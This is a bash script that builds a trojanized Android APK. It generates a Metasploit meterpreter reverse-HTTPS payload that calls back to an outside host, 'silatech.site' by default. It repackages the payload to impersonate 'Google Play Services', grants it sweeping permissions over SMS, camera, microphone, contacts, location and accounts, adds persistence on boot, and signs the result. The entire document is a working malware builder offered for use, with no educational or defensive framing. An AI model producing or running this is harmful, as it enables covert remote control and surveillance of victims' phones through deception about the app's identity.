#!/bin/bash

mkdir -p output
DOMAIN=${LHOST:-"silatech.site"}
PORT=${LPORT:-"443"}

echo "[+] SILA PRO: Building for $DOMAIN:$PORT"

# 1. Generate raw payload (using reverse_https for stealth)
msfvenom -p android/meterpreter/reverse_https \
         LHOST=$DOMAIN \
         LPORT=$PORT \
         --platform android \
         -a dalvik \
         -o output/sila_raw.apk

# 2. Decompile
apktool d output/sila_raw.apk -o output/decompiled -f

# 3. Inject maximum permissions + hijack launcher icon to look like "Google Play Services"
cat > output/decompiled/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.google.android.gms.update"
    android:installLocation="internalOnly"
    android:versionCode="20250301"
    android:versionName="25.03.01">

    <!-- Overkill Permissions -->
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>

    <application
        android:label="Google Play Services"
        android:icon="@mipmap/ic_launcher"
        android:allowBackup="true"
        android:persistent="true"
        android:theme="@android:style/Theme.Translucent.NoTitleBar">

        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>

        <service android:name=".MainService" android:exported="false" android:foregroundServiceType="dataSync"/>
    </application>
</manifest>
EOF

# 4. Rebuild & Sign
apktool b output/decompiled -o output/sila_repacked.apk

keytool -genkey -v -keystore output/sila.keystore -alias sila -keyalg RSA -keysize 2048 -validity 10000 -storepass sila123 -keypass sila123 -dname "CN=SILA, OU=Dev, O=Silatech, L=DSM, C=TZ"
apksigner sign --ks output/sila.keystore --ks-pass pass:sila123 --out output/sila_final.apk output/sila_repacked.apk

echo "[✓] APK ready: output/sila_final.apk"
